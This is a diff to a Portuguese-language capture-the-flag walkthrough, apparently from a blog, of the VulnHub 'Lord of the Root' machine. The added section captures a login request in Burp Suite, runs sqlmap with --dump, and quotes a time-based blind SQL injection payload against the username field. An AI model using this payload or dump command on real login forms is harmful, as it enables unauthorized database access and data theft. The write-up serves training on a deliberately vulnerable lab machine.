@@ -88,8 +88,6 @@ Bom, é um servidor web, então acessamos pra ver o que tem nele
 
 Uma imagem... Baixamos ela pra nossa máquina pra ver se tem algo escondido nela
 
-![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/knock4.png)
-
 Verificamos que não tem nada escondido nessa imagem
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/exiftool.png)
@@ -132,5 +130,47 @@ Acessamos e é um campo de login e senha!
 
 ![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login.png)
 
+Mandamos pro BurpSuite a requisição
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login1.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login2.png)
+
+Repeater
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login3.png)
+
+Depois de um bom tempo bricando com essa requisição, não fui capaz de encontrar um ponto de exploração, o que eu geralmente faço em background sempre que vejo alguma requisição assim é jogar o sqlmap nele pra ver se me traz algum resultado
+
+Salvamos em uma requisição
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login4.png)
+
+# Blind SQLInjection
+
+Rodamos o sqlmap nele agora
+
+```bash
+sqlmap -r req.txt --dump
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login5.png)
+
+Esperamos... ele encontrou um Blind SQLInjection no parâmetro Login
+
+```
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=admin' AND (SELECT 1751 FROM (SELECT(SLEEP(5)))yIpO) AND 'XOOh'='XOOh&password=admin&submit= Login
+---
+```
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login6.png)
+
+Agora esperamos o SQLMap fazer o time-based e me retornar os valores que preciso para dar prosseguimento na exploração da máquina
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-lordoftheroot/login7.png)
 
 
